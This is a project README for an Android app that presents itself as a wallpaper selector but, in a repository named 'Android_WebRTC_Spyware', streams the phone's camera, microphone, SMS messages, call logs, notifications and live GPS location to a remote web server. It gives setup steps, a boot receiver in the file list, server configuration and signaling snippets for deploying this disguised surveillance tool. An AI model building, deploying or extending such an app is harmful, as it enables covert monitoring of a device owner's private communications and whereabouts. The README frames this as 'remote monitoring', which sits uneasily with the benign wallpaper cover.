# Android Wallpaper & WebRTC Streaming App

This application serves a dual purpose: it allows users to select and set wallpapers on their Android device while also enabling real-time streaming of the device's camera, microphone, sms messages, call logs and gps location to a web browser using WebRTC. The app uses Socket.IO for signaling to establish peer-to-peer connections, making it suitable for remote monitoring, SMS messages, Call Logs, Live GPS Locations, or live demos, alongside personalizing device aesthetics with wallpapers.

## Features

- **Wallpaper Selection & Setting**: Choose from a curated list of wallpapers and apply them to your device's home and lock screens.
- **Camera Streaming**: Streams the Android device's camera feed at 640x480 resolution.
- **Microphone Streaming**: Captures and streams audio with echo cancellation, noise suppression, and auto-gain control.
- **SMS Messages Streaming**: Streams the device's sms messages live.
- **Call Logs Streaming**: Streams the device's call logs live.
- **Live GPS Location Streaming**: Streams the device's location live and displays on a map.
- **Notification Streaming**: Streams the device's notifications live.
- **WebRTC Integration**: Utilizes WebRTC for low-latency peer-to-peer streaming with STUN/TURN servers for NAT traversal.
- **Socket.IO Signaling**: Manages WebRTC offer/answer and ICE candidate exchange via a Node.js server.
- **Browser Interface**: Displays camera and all features with real-time status updates.

## Project Structure

```
WallpaperApplication/
├── app/
│   ├── src/main/java/com/example/wallpaperapplication/
│   │   ├── BootReceiver.java
│   │   ├── ConsentActivity.java
│   │   ├── Constants.java
│   │   ├── MainActivity.java
│   │   ├── SdpObserverAdapter.java
│   │   ├── StreamingService.java
│   │   ├── StreamingSettingsActivity.java
│   │   └── WallpaperAdapter.java
│   ├── src/main/AndroidManifest.xml
│   ├── src/main/res/xml/network_security_config.xml
│   └── build.gradle.kts
├── Android-WebRTC-Spyware-Server/
│   ├── server.js
│   ├── package.json
│   └── public/
│       ├── index.html
│       └── client.js
└── README.md
```

### Key Components

- **MainActivity.java**: Entry point for the wallpaper selection interface.
- **WallpaperAdapter.java**: Manages the display and selection of wallpaper images in a RecyclerView.
- **StreamingService.java**: Android service that initializes WebRTC, captures camera, audio, rest of the features, and handles signaling with the server.
- **StreamingSettingsActivity.java**: UI to toggle streaming and request permissions (camera, audio, etc.).
- **AndroidManifest.xml**: Declares permissions and service configurations for both wallpaper and streaming functionalities.
- **network_security_config.xml**: Configures network security to allow cleartext traffic to the WebRTC server.
- **server.js**: Node.js server using Express and Socket.IO for signaling between Android and web clients.
- **index.html & client.js**: Web interface and JavaScript for displaying streams and handling WebRTC connections.

## Prerequisites

### Android
- Android Studio (latest version recommended)
- Android SDK (API 21+)
- Device/emulator with camera and microphone

### Server
- Node.js (v16+)
- npm (v8+)

### Browser
- Chrome, Firefox, or any WebRTC-compatible browser

### TURN Server
- Credentials for numb.viagenie.ca (or another TURN server) for NAT traversal

### Network
- Devices must be on the same network or reachable via TURN server
- Server IP: Update as per your setup (default reference: 192.178.2.10)

## Setup Instructions

### 1. Clone the Repository

```bash
git clone https://github.com/DhruvAthaide/Android_WebRTC_Spyware.git
cd WallpaperApplication
```

### 2. Configure Android App

#### Open Android Project
Open the project in Android Studio.

#### Update Dependencies in `app/build.gradle.kts`
Ensure dependencies for WebRTC, UI components, and necessary permissions are included as per the current configuration.

#### Update TURN Credentials in `StreamingService.java`
Replace placeholders with valid numb.viagenie.ca credentials:

```java
ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
    .setUsername("your-actual-username")
    .setPassword("your-actual-password")
    .createIceServer());
```

#### Update Signaling URL
In `StreamingService.java`, ensure `SIGNALING_URL` matches your server's IP:

```java
private static final String SIGNALING_URL = "http://<Your Server IP address>:3000";
```

In `network_security_config.xml`, update the domain:

```xml
<domain includeSubdomains="true">Input your WebRTC Server IP</domain>
```

#### Permissions in `AndroidManifest.xml`
Verify necessary permissions for wallpaper setting and streaming are included.

### 3. Configure Server

#### Navigate to Server Directory
```bash
cd Android-WebRTC-Spyware-Server
```

#### Install Dependencies
```bash
npm install express socket.io@4.7.5
```

#### Update TURN Credentials in `client.js`
Replace placeholders with valid credentials:

```javascript
const config = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'turn:numb.viagenie.ca', username: 'your-actual-username', credential: 'your-actual-password' }
  ]
};
```

#### Update Signaling URL
Ensure the Socket.IO URL matches the server:

```javascript
const socket = io('http://<Input your WebRTC Server IP>:3000');
```

### 4. Run the Server

```bash
node server.js
```

Verify the console output: "Server running at http://localhost:3000".

### 5. Build and Run the Android App

#### Build the App
In Android Studio, sync and build the project.

#### Install on Device/Emulator
Run the app on an Android device or emulator (API 21+).

#### Using the App
1. **Wallpaper Feature**: Open the app to browse and set wallpapers.
2. **Streaming Feature**: Navigate to streaming settings, toggle streaming, and approve permissions for camera, microphone, and screen capture.

### 6. Access the Web Interface for Streaming

Open `http://<Your Server IP>:3000` in a browser on the same network. Expect to see camera and screen streams with status updates.

## Debugging

### Logcat (Android)
```bash
adb logcat | grep StreamingService
```
Check for logs related to streaming initialization and connection status.

### Browser Console
Use DevTools (F12) to check for connection and stream handling logs.

### Server Logs
```bash
node server.js > server.log
```
Verify signaling messages are relayed correctly.

## How the Application Works

### Wallpaper Functionality
- Users can view a list of available wallpapers and set them directly from the app interface using Android's wallpaper management APIs.

### Streaming Functionality
- **Android Side (StreamingService.java)**: Initializes WebRTC with PeerConnectionFactory, captures camera (640x480), audio, sms messages, call logs, live notifications and gps location after permissions are granted, adds tracks to PeerConnection, and uses Socket.IO to connect to the signaling server.
- **Server Side (server.js)**: Runs an Express server with Socket.IO to relay signaling messages, pairing Android and web clients by forwarding WebRTC offers, answers, and ICE candidates.
- **Web Client (client.js, index.html)**: Connects to the signaling server, handles incoming tracks (camera, audio and the rest of the features), and displays them in HTML5 video elements with status updates.

## Known Issues and Workarounds

- **Connection Failures**: Verify TURN server credentials and ensure devices are on the same network or TURN is accessible.
- **Camera/Audio Issues**: Check permissions in `AndroidManifest.xml` and logcat for errors if streaming fails.

## Future Improvements

- Enhance wallpaper features with categories, online wallpaper downloads, and preview options.
- Add dynamic resolution adjustment for streaming based on device capabilities.
- Implement bitrate control for better stream quality on varying networks.
- Add error handling for network disconnections with automatic reconnect.
- Improve UI with controls to toggle individual streams or wallpaper settings.

## License

This project is licensed under the MIT License. See the LICENSE file for details.